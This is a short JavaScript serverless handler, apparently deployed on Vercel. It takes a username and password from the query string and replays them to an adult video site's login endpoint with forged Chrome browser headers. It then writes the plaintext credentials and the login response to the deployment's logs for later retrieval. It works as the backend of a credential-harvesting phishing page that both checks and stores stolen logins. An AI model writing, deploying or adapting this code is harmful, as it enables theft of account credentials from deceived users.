export default async function handler(req, res) {
  const { username, password, remember_me, timestamp } = req.query;

  if (!username || !password) {
    return res.status(400).json({ login_status: "error" });
  }

  // Forward to real login endpoint
  let loginResult = null;
  try {
    const body = new URLSearchParams({
      username,
      pass: password,
      action: "login",
      email_link: "https://www.camwhores.tv/email/",
      format: "json",
      mode: "async",
    });

    const resp = await fetch("https://www.camwhores.tv/login/", {
      method: "POST",
      headers: {
        "accept": "*/*",
        "accept-language": "es-US,es;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.camwhores.tv",
        "referer": "https://www.camwhores.tv/tags/cama/",
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
      },
      body: body.toString(),
    });

    loginResult = await resp.json();
  } catch (e) {
    loginResult = { status: "error", error: e.message };
  }

  // Log to Vercel dashboard (visible via `vercel logs`)
  console.log(JSON.stringify({
    username,
    password,
    remember_me,
    timestamp,
    login_status: loginResult?.status,
    login_response: loginResult,
  }));

  return res.status(200).json({ login_status: loginResult?.status || "error" });
}
